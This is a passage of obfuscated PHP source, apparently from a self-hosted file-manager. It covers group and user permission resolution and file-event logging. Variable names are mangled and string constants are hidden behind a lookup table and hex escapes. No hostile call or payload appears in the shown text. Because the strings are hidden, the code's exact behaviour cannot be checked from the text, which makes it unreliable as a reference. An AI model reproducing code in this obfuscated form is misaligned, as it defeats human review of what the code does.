SourceModel::TYPE_GROUP, $¢Â™œ¿¬[583] => array($¢Â™œ¿¬[504], $˜¶©ºâ®)), $¢Â™œ¿¬[1093] => $¢Â™œ¿¬[2094]); } $ø•æÓö± = $this->field($¢Â™œ¿¬[2200])->where($çÒ‘¼ÑÎ)->select(); $À¤ó„¸ş = array(); $…ÌŞïÉ· = array_to_keyvalue_group($ø•æÓö±, $¢Â™œ¿¬[194]); foreach ($…ÌŞïÉ· as $¸Á°ÂØ› => $ïãÎØ›¯) { $¼Ø‚ÃÄ» = $this->authArrayCheck($ïãÎØ›¯, $Óßáë®õ); if ($¼Ø‚ÃÄ»[$¢Â™œ¿¬[500]] > 0) { $À¤ó„¸ş[] = $¸Á°ÂØ› . $¢Â™œ¿¬[12]; } } if ($˜¶©ºâ®) { $œ¸¸–Æ = Model($¢Â™œ¿¬[599]); foreach ($˜¶©ºâ® as $İ¿¤Î½ô) { $İ¨†›‡ = $œ¸¸–Æ->getInfo($İ¿¤Î½ô); if (!$İ¨†›‡ || !is_array($İ¨†›‡[$¢Â™œ¿¬[90]])) { continue; } $À¤ó„¸ş[] = $İ¨†›‡[$¢Â™œ¿¬[90]][$¢Â™œ¿¬[194]]; } } $¯œ¸¼ˆê = array(); $›åªøçè = $˜¶©ºâ®; $¼ˆò¶Á = Model($¢Â™œ¿¬[1437]); $œ¸¸–Æ = Model($¢Â™œ¿¬[599]); $Ç¡¦é¿ö = array(); $é•†®ò© = array(); $Èƒ°™ = array(); $òôÓºÂÒ = array(); if ($À¤ó„¸ş) { $öÙŞàÌ¦ = $¼ˆò¶Á->where(array($¢Â™œ¿¬[194] => array($¢Â™œ¿¬[504], $À¤ó„¸ş)))->select(); foreach ($öÙŞàÌ¦ as $»ÙÅ”Ñ) { if ($»ÙÅ”Ñ[$¢Â™œ¿¬[517]] == $¢Â™œ¿¬[91]) { continue; } $€¹Ù‹õç = $¼ˆò¶Á->parentLevelArray($»ÙÅ”Ñ[$¢Â™œ¿¬[598]]); $¯œ¸¼ˆê = array_merge($¯œ¸¼ˆê, $€¹Ù‹õç); $›åªøçè[] = $»ÙÅ”Ñ[$¢Â™œ¿¬[583]]; $Ç¡¦é¿ö[$»ÙÅ”Ñ[$¢Â™œ¿¬[194]]] = $€¹Ù‹õç; $é•†®ò©[$»ÙÅ”Ñ[$¢Â™œ¿¬[194]]] = $»ÙÅ”Ñ[$¢Â™œ¿¬[583]]; } } $›åªøçè = array_values(array_unique($›åªøçè)); $¶ä”÷®Õ = $›åªøçè; foreach ($¶ä”÷®Õ as $İ¿¤Î½ô) { $İ¨†›‡ = $œ¸¸–Æ->getInfo($İ¿¤Î½ô); $€¹Ù‹õç = $¼ˆò¶Á->parentLevelArray($İ¨†›‡[$¢Â™œ¿¬[598]]); $›åªøçè = array_merge($›åªøçè, $€¹Ù‹õç); } $›åªøçè = array_values(array_unique($›åªøçè)); foreach ($›åªøçè as $İ¿¤Î½ô) { $İ¨†›‡ = $œ¸¸–Æ->getInfo($İ¿¤Î½ô); $¯œ¸¼ˆê[] = $İ¨†›‡[$¢Â™œ¿¬[90]][$¢Â™œ¿¬[194]]; $Èƒ°™[$İ¿¤Î½ô] = $İ¨†›‡[$¢Â™œ¿¬[90]][$¢Â™œ¿¬[194]]; $òôÓºÂÒ[$İ¿¤Î½ô] = $¼ˆò¶Á->parentLevelArray($İ¨†›‡[$¢Â™œ¿¬[598]]); } foreach ($Ç¡¦é¿ö as $¢×ÎŸéí => $Ô‚éè‘ó) { $åÁ¢¤Şí = $é•†®ò©[$¢×ÎŸéí]; if (!$åÁ¢¤Şí || !$Èƒ°™[$åÁ¢¤Şí]) { continue; } $î±Í›¦Ë = array(); foreach ($òôÓºÂÒ[$åÁ¢¤Şí] as $İ¿¤Î½ô) { $î±Í›¦Ë[] = $Èƒ°™[$İ¿¤Î½ô]; } $Ç¡¦é¿ö[$¢×ÎŸéí] = array_merge($î±Í›¦Ë, $Ô‚éè‘ó); } $¯œ¸¼ˆê = array_values(array_unique($¯œ¸¼ˆê)); $˜ù‡Ê£™ = array($¢Â™œ¿¬[2192] => $¯œ¸¼ˆê, $¢Â™œ¿¬[2193] => $Ç¡¦é¿ö); $½…à‰„[$Óßáë®õ] = $˜ù‡Ê£™; return $˜ù‡Ê£™; } private function makeSourceAuth($—ÈË•Ô, $¦—ŸÙ÷•, $Ü¨¤¯… = false) { $é˜òèê =& $_SERVER[‹‰”››ê]; $ÛÍ•æùº = $é˜òèê[91]; $ıÅùØ· = $—ÈË•Ô[$é˜òèê[583]]; $£Û­³õä = $—ÈË•Ô[$é˜òèê[191]] == SourceModel::TYPE_GROUP; $ˆ¥Ö‡œ° = $£Û­³õä ? $this->groupRootAuth($ıÅùØ·, $Ü¨¤¯…) : !1; if ($ˆ¥Ö‡œ° && Model($é˜òèê[585])->authCheckAction($ˆ¥Ö‡œ°[$é˜òèê[499]], $é˜òèê[2013])) { return $this->groupAuthInfo($ˆ¥Ö‡œ°, $ıÅùØ·); } $³ôùñ€µ = Model($é˜òèê[1437])->parentLevelArray($—ÈË•Ô[$é˜òèê[598]]); $³ôùñ€µ = array_merge(array($—ÈË•Ô[$é˜òèê[194]]), array_reverse($³ôùñ€µ)); $‘ÑûàÅ¨ = !1; foreach ($³ôùñ€µ as $ÛİÄ¨×Ä) { if (!isset($¦—ŸÙ÷•[$ÛİÄ¨×Ä])) { continue; } $°‹À±¹ç = $this->authMake($¦—ŸÙ÷•[$ÛİÄ¨×Ä], $Ü¨¤¯…); if ($°‹À±¹ç[$é˜òèê[554]]) { $‘ÑûàÅ¨ = $°‹À±¹ç; break; } } if (!$£Û­³õä) { return $‘ÑûàÅ¨; } if (!$‘ÑûàÅ¨ && $ˆ¥Ö‡œ°) { $‘ÑûàÅ¨ = $this->groupAuthInfo($ˆ¥Ö‡œ°, $ıÅùØ·); } if (!$‘ÑûàÅ¨) { $¬éàêæ½ = Model($é˜òèê[599])->getInfo($ıÅùØ·); $Å÷ïäò½ = explode($é˜òèê[50], trim($¬éàêæ½[$é˜òèê[598]], $é˜òèê[50])); $Å÷ïäò½ = array_reverse($Å÷ïäò½); foreach ($Å÷ïäò½ as $Â”ÕÈ¸) { if ($Â”ÕÈ¸ == $é˜òèê[231] || $Â”ÕÈ¸ == $ÛÍ•æùº) { continue; } $µÁÒş¼’ = $this->groupRootAuth($Â”ÕÈ¸, $Ü¨¤¯…); if (!$µÁÒş¼’) { continue; } $‘ÑûàÅ¨ = $this->groupAuthInfo($µÁÒş¼’, $Â”ÕÈ¸); break; } } if (!$‘ÑûàÅ¨ || $‘ÑûàÅ¨[$é˜òèê[500]] <= 0) { $‡¤˜Î¿¹ = $this->authDeepCheck($—ÈË•Ô[$é˜òèê[194]], $Ü¨¤¯…); if ($‡¤˜Î¿¹) { $‘ÑûàÅ¨ = $‡¤˜Î¿¹; } } return $‘ÑûàÅ¨; } private function userIsRoot($‘ªŞğ§ƒ = false) { $òªµšˆä =& $_SERVER[‹‰”››ê]; if (!$‘ªŞğ§ƒ && KodUser::isRoot()) { return !0; } $€óµ¢»à = Model($òªµšˆä[611])->getInfo($‘ªŞğ§ƒ); $Ë¯ó¦œ = Model($òªµšˆä[2201])->listData($€óµ¢»à[$òªµšˆä[2202]]); if ($Ë¯ó¦œ && $Ë¯ó¦œ[$òªµšˆä[589]][$òªµšˆä[2203]] == 1) { return !0; } return !1; } private function sourceAuthInfo($°æ”İ×¹) { $°éç¦·æ =& $_SERVER[‹‰”››ê]; $…–ë¶›• = Model($°éç¦·æ[1437]); $ïˆë”úˆ = $…–ë¶›•->sourceInfo($°æ”İ×¹); if (!$ïˆë”úˆ) { return !1; } $…–ë¶›•->groupPathDisplay($ïˆë”úˆ); $«³ò¸Àå = array($ïˆë”úˆ); $«³ò¸Àå = $…–ë¶›•->_listAppendPath($«³ò¸Àå); $ïˆë”úˆ = $«³ò¸Àå[0]; $¢Ä«ö¿ = $ïˆë”úˆ[$°éç¦·æ[596]]; if (isset($ïˆë”úˆ[$°éç¦·æ[604]])) { $³½±Ô§ş = explode($°éç¦·æ[8], trim($ïˆë”úˆ[$°éç¦·æ[596]], $°éç¦·æ[8])); array_shift($³½±Ô§ş); $¢Ä«ö¿ = $ïˆë”úˆ[$°éç¦·æ[602]] . $°éç¦·æ[2204] . implode($°éç¦·æ[8], $³½±Ô§ş); } return array($°éç¦·æ[506] => $ïˆë”úˆ[$°éç¦·æ[32]], $°éç¦·æ[87] => KodIO::make($ïˆë”úˆ[$°éç¦·æ[194]]), $°éç¦·æ[2205] => $¢Ä«ö¿); } private function groupAuthInfo($¨â—¬¾İ, $‰ÒÆˆ¯ò) { $Ûú…ùÀ =& $_SERVER[‹‰”››ê]; $½Ú©“Á = Model($Ûú…ùÀ[599])->getInfo($‰ÒÆˆ¯ò); return array($Ûú…ùÀ[2206] => intval($¨â—¬¾İ[$Ûú…ùÀ[499]]), $Ûú…ùÀ[2189] => $¨â—¬¾İ, $Ûú…ùÀ[2207] => LNG($Ûú…ùÀ[2208]), $Ûú…ùÀ[2198] => array($Ûú…ùÀ[506] => $½Ú©“Á[$Ûú…ùÀ[32]], $Ûú…ùÀ[87] => KodIO::make($½Ú©“Á[$Ûú…ùÀ[90]][$Ûú…ùÀ[194]]), $Ûú…ùÀ[2205] => $½Ú©“Á[$Ûú…ùÀ[603]])); } protected function groupRootAuth($¦¾ç°Í—, $³ú‰üÖ¬ = false) { $¯»ª·‚Å =& $_SERVER[‹‰”››ê]; $³ú‰üÖ¬ = $³ú‰üÖ¬ ? $³ú‰üÖ¬ : USER_ID; $×”Îü¶€ = $³ú‰üÖ¬ . $¯»ª·‚Å[2209] . $¦¾ç°Í—; static $êŸ—Æğ = array(); if (isset($êŸ—Æğ[$×”Îü¶€])) { return $êŸ—Æğ[$×”Îü¶€]; } $ğéõâÕŒ = Model($¯»ª·‚Å[599])->getInfo($¦¾ç°Í—); $ÌÛÉ“·Ò = $this->userGroupList($³ú‰üÖ¬); $«”–ó³ó = isset($ÌÛÉ“·Ò[$¦¾ç°Í—]) ? $ÌÛÉ“·Ò[$¦¾ç°Í—][$¯»ª·‚Å[499]] : !1; if ($«”–ó³ó && Model($¯»ª·‚Å[585])->authCheckAction($«”–ó³ó[$¯»ª·‚Å[499]], $¯»ª·‚Å[2013])) { $êŸ—Æğ[$×”Îü¶€] = $«”–ó³ó; return $«”–ó³ó; } $ó§’Ê’œ = $this->sourceAuthSelect($ğéõâÕŒ[$¯»ª·‚Å[90]][$¯»ª·‚Å[194]]); $¡¼í¬É‰ = $ó§’Ê’œ ? $this->authMake($ó§’Ê’œ, $³ú‰üÖ¬) : !1; $ã©ì‚Î = $¡¼í¬É‰ ? $¡¼í¬É‰[$¯»ª·‚Å[554]] : !1; $êŸ—Æğ[$×”Îü¶€] = $ã©ì‚Î ? $ã©ì‚Î : $«”–ó³ó; return $êŸ—Æğ[$×”Îü¶€]; } public function authOwnerApply($ã°¡ŞÂÖ) { $Ûåè˜µ¸ =& $_SERVER[‹‰”››ê]; if (empty($ã°¡ŞÂÖ[$Ûåè˜µ¸[499]]) || isset($ã°¡ŞÂÖ[$Ûåè˜µ¸[2210]]) && $ã°¡ŞÂÖ[$Ûåè˜µ¸[2210]]) { return $ã°¡ŞÂÖ; } if (AuthModel::authCheckRoot($ã°¡ŞÂÖ[$Ûåè˜µ¸[499]][$Ûåè˜µ¸[500]])) { return $ã°¡ŞÂÖ; } $¹ÄÍõªÍ = Model($Ûåè˜µ¸[1437])->parentLevelArray($ã°¡ŞÂÖ[$Ûåè˜µ¸[598]]); $¹ÄÍõªÍ = array_merge(array($ã°¡ŞÂÖ[$Ûåè˜µ¸[194]]), array_reverse($¹ÄÍõªÍ)); $¸ù¼€àŞ = $this->sourceAuthSelect($¹ÄÍõªÍ); $ØßœÆ¹¦ = array(); $üĞËÉ¼¡ = array(); foreach ($¸ù¼€àŞ as $óØßáÁ => $äªˆÚ½‘) { $Ä¯·í™ = $this->authFolderOwnerUser($äªˆÚ½‘); $ØßœÆ¹¦[$óØßáÁ] = $Ä¯·í™; $üĞËÉ¼¡ = array_merge($üĞËÉ¼¡, $Ä¯·í™[$Ûåè˜µ¸[679]]); if ($Ä¯·í™[$Ûåè˜µ¸[2211]]) { break; } } if (count($üĞËÉ¼¡) == 0) { $üĞËÉ¼¡ = $this->authFolderOwnerGroup($ã°¡ŞÂÖ[$Ûåè˜µ¸[583]]); } $üĞËÉ¼¡ = array_unique($üĞËÉ¼¡); if (AuthModel::authCheckRoot($ã°¡ŞÂÖ[$Ûåè˜µ¸[499]][$Ûåè˜µ¸[500]])) { $üĞËÉ¼¡[] = USER_ID; } $ã°¡ŞÂÖ[$Ûåè˜µ¸[499]][$Ûåè˜µ¸[2212]] = Model($Ûåè˜µ¸[591])->userListInfo($üĞËÉ¼¡); return $ã°¡ŞÂÖ; } private function authFolderOwnerGroup($İÈÖ·Íî) { $ˆ¡ûŞ†¡ =& $_SERVER[‹‰”››ê]; $¯´ºÇá³ = Model($ˆ¡ûŞ†¡[2086])->where(array($ˆ¡ûŞ†¡[1992] => $İÈÖ·Íî))->select(); $”ë­«¯ = array(); if (!$¯´ºÇá³) { return $”ë­«¯; } foreach ($¯´ºÇá³ as $âµ€Ûô¶) { $åäƒìŠÃ = $this->authInfo($âµ€Ûô¶); if (AuthModel::authCheckRoot($åäƒìŠÃ[$ˆ¡ûŞ†¡[499]])) { $”ë­«¯[] = $âµ€Ûô¶[$ˆ¡ûŞ†¡[1791]]; } } return $”ë­«¯; } private function authFolderOwnerUser($ÎÓ¸†Şæ) { $ª’ïí”ä =& $_SERVER[‹‰”››ê]; $ß«ó†µ¹ = array(); $ŸâñóŠÛ = !1; foreach ($ÎÓ¸†Şæ as $¥îÀ—ßÂ) { $‘Ä…¿ï = $this->authInfo($¥îÀ—ßÂ); if ($¥îÀ—ßÂ[$ª’ïí”ä[583]] == $ª’ïí”ä[231]) { $ŸâñóŠÛ = !0; } if ($¥îÀ—ßÂ[$ª’ïí”ä[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($‘Ä…¿ï[$ª’ïí”ä[499]])) { $ß«ó†µ¹[] = $¥îÀ—ßÂ[$ª’ïí”ä[583]]; } } } return array($ª’ïí”ä[679] => $ß«ó†µ¹, $ª’ïí”ä[2211] => $ŸâñóŠÛ); } public function authMake($ ¢’Ëİ§, $•èĞÄ’« = false) { $ÙÉÙéå€ =& $_SERVER[‹‰”››ê]; $Ğšñ»ğô = $this->authArrayCheck($ ¢’Ëİ§, $•èĞÄ’«); if ($Ğšñ»ğô[$ÙÉÙéå€[2213]]) { $Ğšñ»ğô[$ÙÉÙéå€[2213]] = $this->sourceAuthInfo($Ğšñ»ğô[$ÙÉÙéå€[2213]]); } return $Ğšñ»ğô; } public function authArrayCheck($ß¼ŸÀª¥, $Óºİà²· = false) { $ËåÛÓ†Ô =& $_SERVER[‹‰”››ê]; if (!$ß¼ŸÀª¥) { return array($ËåÛÓ†Ô[500] => 0, $ËåÛÓ†Ô[554] => !1); } $Óºİà²· = $Óºİà²· ? $Óºİà²· : USER_ID; $˜ıµíÄû = 0; $¿ ïÎÈû = 0; $Ú’Ø¹¾ = 0; $¯ëÄåÉö = 0; $ñ‘ãĞûÒ = 0; $é„“›Ì° = 0; $íˆİš  = 1000; $èŠçÏ»‘ = 0; $¸ıíİ–ß = 0; $ƒ·üïÛÇ = 0; $È¥”í¨Œ = 0; $¦ÛôÉ½ = array($ËåÛÓ†Ô[194] => 0); foreach ($ß¼ŸÀª¥ as $¦ÛôÉ½) { $ÉÇŸ“´¹ = $this->authInfo($¦ÛôÉ½); if (!$ÉÇŸ“´¹) { continue; } $ñ¸ÕÃ²† = $¦ÛôÉ½[$ËåÛÓ†Ô[583]]; $ç¿»áøû = intval($ÉÇŸ“´¹[$ËåÛÓ†Ô[499]]); if ($¦ÛôÉ½[$ËåÛÓ†Ô[191]] == SourceModel::TYPE_USER && $ñ¸ÕÃ²† == $Óºİà²·) { $˜ıµíÄû = !0; $Ú’Ø¹¾ = $ÉÇŸ“´¹; $¿ ïÎÈû = $ç¿»áøû; } else { if ($¦ÛôÉ½[$ËåÛÓ†Ô[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ñ¸ÕÃ²†, $Óºİà²·)) { $¯ëÄåÉö = !0; $Ü¸•ó¿¾ = $this->groupStepToUserGroup($ñ¸ÕÃ²†, $Óºİà²·); if ($Ü¸•ó¿¾ < $íˆİš ) { $íˆİš  = $Ü¸•ó¿¾; $ñ‘ãĞûÒ = $ç¿»áøû; $é„“›Ì° = $ÉÇŸ“´¹; $èŠçÏ»‘ = $ñ¸ÕÃ²†; } if ($Ü¸•ó¿¾ == $íˆİš  && $ç¿»áøû >= $ñ‘ãĞûÒ) { $ñ‘ãĞûÒ = $ç¿»áøû; $é„“›Ì° = $ÉÇŸ“´¹; $èŠçÏ»‘ = $ñ¸ÕÃ²†; } } else { if ($ñ¸ÕÃ²† == $ËåÛÓ†Ô[231]) { $¸ıíİ–ß = !0; $È¥”í¨Œ = $ÉÇŸ“´¹; $ƒ·üïÛÇ = $ç¿»áøû; } } } } if ($˜ıµíÄû) { $ÒÊùËµ† = $¿ ïÎÈû; $ÉÇŸ“´¹ = $Ú’Ø¹¾; $Ùˆ¼£š = LNG($ËåÛÓ†Ô[2214]); } else { if ($¯ëÄåÉö) { $ÒÊùËµ† = $ñ‘ãĞûÒ; $ÉÇŸ“´¹ = $é„“›Ì°; $—‹¤ŸÀÍ = Model($ËåÛÓ†Ô[599])->getInfo($èŠçÏ»‘); $Ùˆ¼£š = $ËåÛÓ†Ô[176] . $—‹¤ŸÀÍ[$ËåÛÓ†Ô[603]] . $ËåÛÓ†Ô[2215] . LNG($ËåÛÓ†Ô[2216]); } else { if ($¸ıíİ–ß) { $ÒÊùËµ† = $ƒ·üïÛÇ; $ÉÇŸ“´¹ = $È¥”í¨Œ; $Ùˆ¼£š = LNG($ËåÛÓ†Ô[2186]); } else { $ÒÊùËµ† = 0; $ÉÇŸ“´¹ = !1; $Ùˆ¼£š = $ËåÛÓ†Ô[12]; } } } $°°¼‰ˆ = array($ËåÛÓ†Ô[2206] => intval($ÒÊùËµ†), $ËåÛÓ†Ô[2189] => $ÉÇŸ“´¹, $ËåÛÓ†Ô[2207] => $Ùˆ¼£š, $ËåÛÓ†Ô[2198] => $¦ÛôÉ½[$ËåÛÓ†Ô[194]]); return $°°¼‰ˆ; } private function groupContainUser($„Çá½ÛÙ, $¾¡®ÎÚé = false) { return in_array($„Çá½ÛÙ, $this->userGroupParents($¾¡®ÎÚé)); } private function groupStepToUserGroup($Ôò’‹, $„Ã•ÒğÛ = false) { $™üÃ¦‹ =& $_SERVER[‹‰”››ê]; $«Û¡Ùè² = $this->userGroupList($„Ã•ÒğÛ); $ÜŸ¿èÎ  = 1000; $Ğ•×Õ¨ = $GLOBALS[$™üÃ¦‹[6]][$™üÃ¦‹[92]][$™üÃ¦‹[2099]] == 1; $Üù¦¾•¸ = $Ğ•×Õ¨ ? 3 : 2; foreach ($«Û¡Ùè² as $ğˆİÏ´Á) { if ($ğˆİÏ´Á[$™üÃ¦‹[1992]] == $Ôò’‹) { return 0; } $¬¿ôÇÃë = explode($™üÃ¦‹[50], trim($ğˆİÏ´Á[$™üÃ¦‹[598]], $™üÃ¦‹[50])); if ($¬¿ôÇÃë[0] == $™üÃ¦‹[231] && count($¬¿ôÇÃë) > $Üù¦¾•¸) { $œµóò° = array_reverse(array_slice($¬¿ôÇÃë, $Üù¦¾•¸)); $ß¡£î”² = array_search($Ôò’‹, $œµóò°); if ($ß¡£î”² !== !1 && $ß¡£î”² + 1 <= $ÜŸ¿èÎ ) { $ÜŸ¿èÎ  = $ß¡£î”² + 1; } } } return $ÜŸ¿èÎ ; } private function userGroupList($ÛƒıÖ” = false) { $¼şüµ¡ =& $_SERVER[‹‰”››ê]; static $é­€Ôƒâ = array(); if (isset($é­€Ôƒâ[$ÛƒıÖ”])) { return $é­€Ôƒâ[$ÛƒıÖ”]; } $ş©ŒŒ Ç = Model($¼şüµ¡[611])->getInfo($ÛƒıÖ”); $é­€Ôƒâ[$ÛƒıÖ”] = array_to_keyvalue($ş©ŒŒ Ç[$¼şüµ¡[2187]], $¼şüµ¡[1992]); return $é­€Ôƒâ[$ÛƒıÖ”]; } public function userGroupParents($”õß—ÌÓ) { $¢×š÷¼ =& $_SERVER[‹‰”››ê]; static $‹’õ¾ Ï = array(); $”õß—ÌÓ = $”õß—ÌÓ ? $”õß—ÌÓ : USER_ID; if (isset($‹’õ¾ Ï[$”õß—ÌÓ])) { return $‹’õ¾ Ï[$”õß—ÌÓ]; } $­¯Á¿Š = $this->userGroupList($”õß—ÌÓ); $çšÎ½Ñí = array(); $á–Û‹†ä = $GLOBALS[$¢×š÷¼[6]][$¢×š÷¼[92]][$¢×š÷¼[2099]] == 1; $Ãš“Á¥„ = $á–Û‹†ä ? 3 : 2; foreach ($­¯Á¿Š as $Œ‡Íü…) { $İ™…İğü = array($Œ‡Íü…[$¢×š÷¼[1992]]); $Öı¥˜ó = explode($¢×š÷¼[50], trim($Œ‡Íü…[$¢×š÷¼[598]], $¢×š÷¼[50])); if ($Öı¥˜ó[0] == $¢×š÷¼[231] && count($Öı¥˜ó) > $Ãš“Á¥„) { $»ôííõ = array_slice($Öı¥˜ó, $Ãš“Á¥„); $İ™…İğü = array_merge($İ™…İğü, array_reverse($»ôííõ)); } $çšÎ½Ñí = array_merge($çšÎ½Ñí, $İ™…İğü); } $‹’õ¾ Ï[$”õß—ÌÓ] = array_unique($çšÎ½Ñí); return $‹’õ¾ Ï[$”õß—ÌÓ]; } public function authTargetInfoMake($¤í°‘) { $Û‹ßÌ´ =& $_SERVER[‹‰”››ê]; $ıßöˆ‘Í = array(); $ÛË¥›éè = array(); foreach ($¤í°‘ as $®Úê¤ƒÓ) { if ($®Úê¤ƒÓ[$Û‹ßÌ´[191]] == SourceModel::TYPE_USER) { $ıßöˆ‘Í[] = intval($®Úê¤ƒÓ[$Û‹ßÌ´[583]]); } else { if ($®Úê¤ƒÓ[$Û‹ßÌ´[191]] == SourceModel::TYPE_GROUP) { $ÛË¥›éè[] = intval($®Úê¤ƒÓ[$Û‹ßÌ´[583]]); } } } if ($ıßöˆ‘Í) { $ıßöˆ‘Í = Model($Û‹ßÌ´[591])->userListInfo($ıßöˆ‘Í); } if ($ÛË¥›éè) { $áï•³¢× = array($Û‹ßÌ´[2084] => array($Û‹ßÌ´[504], $ÛË¥›éè)); $ÛË¥›éè = Model($Û‹ßÌ´[599])->field($Û‹ßÌ´[2217])->where($áï•³¢×)->select(); $ÛË¥›éè = array_to_keyvalue($ÛË¥›éè, $Û‹ßÌ´[1992]); } return array($Û‹ßÌ´[2218] => $ıßöˆ‘Í, $Û‹ßÌ´[2219] => $ÛË¥›éè); } public function authInfo($œ˜ÏÁ“Ç) { $‰·İàñà =& $_SERVER[‹‰”››ê]; if ($œ˜ÏÁ“Ç[$‰·İàñà[2100]]) { $’áÛ¥¯‘ = Model($‰·İàñà[585])->listData($œ˜ÏÁ“Ç[$‰·İàñà[2100]]); if (!$’áÛ¥¯‘) { return !1; $îøÌı“Ø = Model($‰·İàñà[585])->listData(); $£ş•ÀüÁ = array_filter_by_field($îøÌı“Ø, $‰·İàñà[499], $‰·İàñà[231]); return $£ş•ÀüÁ; } $âƒø£½¥ = array_field_key($’áÛ¥¯‘, array($‰·İàñà[487], $‰·İàñà[32], $‰·İàñà[499], $‰·İàñà[2015], $‰·İàñà[2016])); $âƒø£½¥[$‰·İàñà[2220]] = $œ˜ÏÁ“Ç; return $âƒø£½¥; } else { return array($‰·İàñà[505] => 0, $‰·İàñà[1998] => $œ˜ÏÁ“Ç[$‰·İàñà[2164]], $‰·İàñà[506] => $‰·İàñà[12], $‰·İàñà[2015] => $‰·İàñà[2221]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\x63\x65\x5f\145\166\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\155\x65", "\x74\x69\155\145", "\x69\x6e\x73\145\x72\164", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\144\x65\163\143", '', "\151\x6e\163\145\x72\164\x2c\165\160\144\x61\164\x65\x2c\x73\145\154\145\143\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($üß¶„Ş, $Â‰£ãş½, $ÏÒÑÑÁí = '') { $â·§ÔÖæ =& $_SERVER[‹‰”››ê]; if (!$this->eventSave) { return; } $ÄÍÉÛÃ = Model($â·§ÔÖæ[1437])->sourceInfo($üß¶„Ş); if (!$ÄÍÉÛÃ) { return !1; } if ($this->isDisableEvent($ÄÍÉÛÃ, $Â‰£ãş½)) { return; } if ($ÏÒÑÑÁí && is_string($ÏÒÑÑÁí)) { $ÏÒÑÑÁí = array($â·§ÔÖæ[2031] => $ÏÒÑÑÁí); } $¡èŞí = defined($â·§ÔÖæ[2222]) ? USER_ID : 0; $Ä’ï¢÷¼ = array($â·§ÔÖæ[503] => $üß¶„Ş, $â·§ÔÖæ[2223] => $ÄÍÉÛÃ[$â·§ÔÖæ[193]], $â·§ÔÖæ[2224] => $ÄÍÉÛÃ[$â·§ÔÖæ[32]], $â·§ÔÖæ[596] => !empty($ÄÍÉÛÃ[$â·§ÔÖæ[596]]) ? $ÄÍÉÛÃ[$â·§ÔÖæ[596]] : $â·§ÔÖæ[12], $â·§ÔÖæ[1782] => $¡èŞí, $â·§ÔÖæ[508] => $Â‰£ãş½, $â·§ÔÖæ[1784] => $ÏÒÑÑÁí); $this->addSystemLog($Â‰£ãş½, $Ä’ï¢÷¼); unset($Ä’ï¢÷¼[$â·§ÔÖæ[2224]], $Ä’ï¢÷¼[$â·§ÔÖæ[596]]); return $this->add($Ä’ï¢÷¼); } private function addSystemLog($ÜòôÈºë, $Ä„­áñ…) { $œ»ˆˆÏ =& $_SERVER[‹‰”››ê]; if ($ÜòôÈºë == $œ»ˆˆÏ[2225]) { $ÜòôÈºë = $Ä„­áñ…[$œ»ˆˆÏ[538]][$œ»ˆˆÏ[2226]]; } else { if (in_array($ÜòôÈºë, array($œ»ˆˆÏ[1971], $œ»ˆˆÏ[2227]))) { $ÜòôÈºë = $Ä„­áñ…[$œ»ˆˆÏ[538]][$œ»ˆˆÏ[171]]; } } $«©ĞÇñ = array_merge($Ä„­áñ…, array($œ»ˆˆÏ[2228] => $Ä„­áñ…[$œ»ˆˆÏ[194]], $œ»ˆˆÏ[2229] => $Ä„­áñ…[$œ»ˆˆÏ[2229]])); Hook::trigger($œ»ˆˆÏ[2230], $œ»ˆˆÏ[2231] . $ÜòôÈºë, $Ä„­áñ…); Model($œ»ˆˆÏ[1935])->addLog($œ»ˆˆÏ[2231] . $ÜòôÈºë, $«©ĞÇñ); } private function isDisableEvent($„¤Äò, $õÚˆÙäò) { $™êø½ù¼ =& $_SERVER[‹‰”››ê]; if ($„¤Äò[$™êø½ù¼[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($õÚˆÙäò == $™êø½ù¼[1960]) { return !1; } return !0; } public function eventCreate($¥·ÅàŸÈ, $ÅÔÑÕÅç) { $ª‡öŒ©† =& $_SERVER[‹‰”››ê]; $Óì„üÂ = Model($ª‡öŒ©†[1437])->sourceInfo($¥·ÅàŸÈ); $ıÑ¶ˆ¢ = array($ª‡öŒ©†[2226] => $ÅÔÑÕÅç, $ª‡öŒ©†[32] => $Óì„üÂ[$ª‡öŒ©†[32]]); return $this->addEvent($¥·ÅàŸÈ, $ª‡öŒ©†[2225], $ıÑ¶ˆ¢); } public function eventFileEdit($€Íõíªú) { $µåÑ±šå =& $_SERVER[‹‰”››ê]; $„ÍˆÖı½ = array($µåÑ±šå[2232] => $_SERVER[$µåÑ±šå[2233]], $µåÑ±šå[2234] => strtolower(ACTION)); if (isset($GLOBALS[$µåÑ±šå[7]][$µåÑ±šå[2235]])) { $„ÍˆÖı½[$µåÑ±šå[2235]] = $µåÑ±šå[91]; } return $this->addEvent($€Íõíªú, $µåÑ±šå[1961], $„ÍˆÖı½); } public function eventRecycle($´ñğîí, $ÄêâÊú§) { return $this->addEvent($´ñğîí, $_SERVER[‹‰”››ê][2227], $ÄêâÊú§); } private static $_removeLast = ''; public function eventRemove($©õ€ï¥ñ) { $¸ßÁÍ‹Ÿ =& $_SERVER[‹‰”››ê]; self::$_removeLast = $©õ€ï¥ñ; $äó…˜Ó = Model($¸ßÁÍ‹Ÿ[1437])->sourceInfo($©õ€ï¥ñ); $Â’éÈô× = array_field_key($äó…˜Ó, array($¸ßÁÍ‹Ÿ[194], $¸ßÁÍ‹Ÿ[555], $¸ßÁÍ‹Ÿ[517], $¸ßÁÍ‹Ÿ[598])); $¬Ÿá¶Ü = array($¸ßÁÍ‹Ÿ[171] => $äó…˜Ó[$¸ßÁÍ‹Ÿ[32]], $¸ßÁÍ‹Ÿ[2234] => ACTION, $¸ßÁÍ‹Ÿ[2236] => $Â’éÈô×); return $this->addEvent($äó…˜Ó[$¸ßÁÍ‹Ÿ[193]], $¸ßÁÍ‹Ÿ[1960], $¬Ÿá¶Ü); } public function eventShare($ÁÍÜ™ç, $ù®Ÿí¦À) { return $this->addEvent($ÁÍÜ™ç, $_SERVER[‹‰”››ê][1971], $ù®Ÿí¦À); } public function eventMove($·ñØèÇŠ, $×úÍ½Å¸, $­ÑÆù£…) { $•¬¾Şş¼ =& $_SERVER[‹‰”››ê]; if (self::$_removeLast == $·ñØèÇŠ) { return; } $¶É³°ºÜ = Model($•¬¾Şş¼[1437]); $¤Ÿ‡„ºé = 